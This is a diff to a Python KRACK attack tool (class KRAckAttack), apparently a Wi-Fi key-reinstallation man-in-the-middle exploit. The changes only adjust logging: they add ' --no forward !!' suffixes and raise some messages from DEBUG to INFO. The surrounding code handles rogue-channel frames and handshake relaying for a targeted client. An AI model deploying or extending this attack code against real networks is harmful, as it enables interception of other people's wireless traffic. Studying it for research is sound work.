@@ -616,7 +616,7 @@ class KRAckAttack():
 		if p.addr1 == self.apmac:
 			# If it's an authentication to the real AP, always display it ...
 			if p.haslayer(Dot11Auth):
-				print_rx(INFO, "Real channel ", p, color="orange")
+				print_rx(INFO, "Real channel ", p, color="orange", suffix=" --no forward !!")
 
 				# ... with an extra clear warning when we wanted to MitM this specific client
 				if self.clientmac == p.addr2:
@@ -639,7 +639,7 @@ class KRAckAttack():
 
 			# For all other frames, only display them if they come from the targeted client
 			elif self.clientmac is not None and self.clientmac == p.addr2:
-				print_rx(INFO, "Real channel ", p)
+				print_rx(INFO, "Real channel ", p, suffix=" --no forward !!")
 
 			# Prevent the AP from thinking clients that are connecting are sleeping, until attack completed or failed
 			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Attack_Started:
@@ -662,10 +662,10 @@ class KRAckAttack():
 					# !-- CHECK[y]: client 要在接收到 msg3 送出 msg4 前，切換到 rogue channel
 					# !-- CHECK[ ]: time out problem?
 					if self.handle_to_client_pairwise(client, p):
-						print_rx(DEBUG, "Real channel ", p, suffix=" -- MitM'ing pass forward !!")
+						print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing pass forward !!")
 						pass
 					elif self.handle_to_client_groupkey(client, p):
-						print_rx(DEBUG, "Real channel ", p, suffix=" -- MitM'ing pass forward !!")
+						print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing pass forward !!")
 						pass
 					elif p.haslayer(Dot11Deauth):
 						del self.clients[p.addr1]
@@ -681,7 +681,7 @@ class KRAckAttack():
 
 		# 3. Always display all frames sent by or to the targeted client
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
-			print_rx(INFO, "Real channel ", p)
+			print_rx(INFO, "Real channel ", p, suffix=" --no forward !!")
 
 	def handle_rx_roguechan(self):
 		p, origin_p = self.sock_rogue.recv()
@@ -694,7 +694,7 @@ class KRAckAttack():
 				self.last_rogue_beacon = time.time()
 			# Display all frames sent to the targeted client
 			if self.clientmac is not None and p.addr1 == self.clientmac:
-				print_rx(INFO, "Rogue channel", p)
+				print_rx(INFO, "Rogue channel", p, suffix=" --no forward !!")
 
 		# 2. Handle frames sent TO the AP
 		elif p.addr1 == self.apmac:
@@ -714,7 +714,7 @@ class KRAckAttack():
 				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
 			# Always display all frames sent by the targeted client
 			elif p.addr2 == self.clientmac:
-				print_rx(INFO, "Rogue channel", p)
+				print_rx(INFO, "Rogue channel", p, suffix=" --no forward !!")
 
 			# If this now belongs to a client we want to track, process the packet further
 			if client is not None:
@@ -742,7 +742,7 @@ class KRAckAttack():
 
 		# 3. Always display all frames sent by or to the targeted client
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
-			print_rx(INFO, "Rogue channel", p)
+			print_rx(INFO, "Rogue channel", p, suffix=" --no forward !!")
 
 	def handle_hostapd_out(self):
 		# hostapd always prints lines so this should not block
